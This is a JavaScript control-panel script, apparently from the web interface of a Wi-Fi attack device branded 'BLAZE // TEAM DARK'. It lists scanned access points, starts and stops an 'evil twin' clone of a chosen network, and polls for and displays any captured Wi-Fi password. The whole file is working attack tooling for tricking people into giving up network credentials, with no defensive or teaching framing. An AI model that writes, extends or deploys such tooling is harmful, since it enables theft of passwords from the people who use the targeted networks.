/* BLAZE // TEAM DARK - evil twin control */
var twinRunning = false;
var twinTimer = null;
var twinApList = [];

function twinReload() {
	getFile("scan.json", function (res) {
		var j = JSON.parse(res);
		twinApList = j.aps || [];
		var sel = getE("twinTarget");
		sel.innerHTML = "";
		for (var i = 0; i < twinApList.length; i++) {
			var o = document.createElement("option");
			o.value = i;
			o.textContent = twinApList[i][0] + " (" + twinApList[i][2] + ")";
			sel.appendChild(o);
		}
	});
}

function twinToggle() {
	if (twinRunning) {
		getFile("twin?cmd=stop", function () {
			twinRunning = false;
			getE("twinStart").textContent = "START TWIN";
			getE("twinStatus").textContent = "STOPPED";
			stopPoll();
		});
	} else {
		var idx = getE("twinTarget").value;
		if (idx === "" || idx === null) return;
		getFile("twin?cmd=start&ap=" + idx, function () {
			twinRunning = true;
			getE("twinStart").textContent = "STOP TWIN";
			getE("twinStatus").textContent = "RUNNING";
			startPoll();
		});
	}
}

function startPoll() {
	stopPoll();
	twinTimer = setInterval(function () {
		getFile("twin.json", function (res) {
			var j = JSON.parse(res);
			twinRunning = !!j.active;
			getE("twinStatus").textContent = j.active ? ("RUNNING: " + j.ssid) : "IDLE";
			getE("twinCapture").textContent = j.password ? ("Captured: " + j.password) : "";
			getE("twinStart").textContent = j.active ? "STOP TWIN" : "START TWIN";
		}, 5000, null, function () { });
	}, 1500);
}

function stopPoll() {
	if (twinTimer) { clearInterval(twinTimer); twinTimer = null; }
}

function load() {
	twinReload();
	getFile("twin.json", function (res) {
		var j = JSON.parse(res);
		twinRunning = !!j.active;
		getE("twinStatus").textContent = j.active ? ("RUNNING: " + j.ssid) : "IDLE";
		getE("twinCapture").textContent = j.password ? ("Captured: " + j.password) : "";
		getE("twinStart").textContent = j.active ? "STOP TWIN" : "START TWIN";
		if (j.active) startPoll();
	});
}
